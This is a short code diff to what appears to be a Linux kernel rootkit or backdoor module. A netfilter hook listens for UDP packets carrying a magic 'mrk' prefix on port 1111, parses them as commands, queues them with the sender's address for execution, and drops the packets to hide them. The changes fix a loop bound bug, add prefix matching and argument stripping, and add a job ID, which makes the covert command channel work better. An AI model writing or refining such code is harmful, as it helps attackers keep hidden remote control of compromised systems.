@@ -8,7 +8,7 @@
 
 #include "headers/main.h"
 
-#define CMD_MAGIC ("mtk")
+#define CMD_MAGIC ("mrk")
 #define CMD_MAGIC_LEN (strlen(CMD_MAGIC))
 #define CMD_PORT (1111)
 #define RESPONSE_DATA_LEN (3)
@@ -175,8 +175,8 @@ static int get_udp_user_data(struct sk_buff *skb, const char **user_data) {
 
 static struct cmd_type *match_buffer_to_cmd_type(const char *buffer) {
     struct cmd_type *cmd = NULL;
-    for (cmd = cmds; cmd < (cmd + ARRAY_SIZE(cmds)); ++cmd) {
-        if (!strcmp(buffer, cmd->name)) {
+    for (cmd = cmds; cmd < (cmds + ARRAY_SIZE(cmds)); ++cmd) {
+        if (!strncmp(buffer, cmd->name, strlen(cmd->name))) {
             return cmd;
         }
     }
@@ -211,6 +211,8 @@ static unsigned int MRK_hookfn(void *priv, struct sk_buff *skb, const struct nf_
 
     cmd = match_buffer_to_cmd_type(user_data);
     if (cmd == NULL) return NF_ACCEPT;
+    user_data += strlen(cmd->name);
+    user_data_len -= strlen(cmd->name);
 
     command_work = kmalloc(sizeof(struct MRK_command_work), GFP_KERNEL);
     INIT_WORK(&command_work->work, handle_command);
@@ -220,12 +222,13 @@ static unsigned int MRK_hookfn(void *priv, struct sk_buff *skb, const struct nf_
     memcpy(arg, user_data, user_data_len);
     arg[user_data_len] = '\0';
     command_work->arg = arg;
+    command_work->job_id = job_id;
     command_work->local_addr = iph->daddr;
     command_work->remote_addr = iph->saddr;
     command_work->remote_port = udph->source;
     memcpy(command_work->remote_mac, eth_hdr(skb)->h_source, ETH_ALEN);
     command_work->dev = skb->dev;
-    
+
     schedule_work(&command_work->work);
     return NF_DROP;
 }
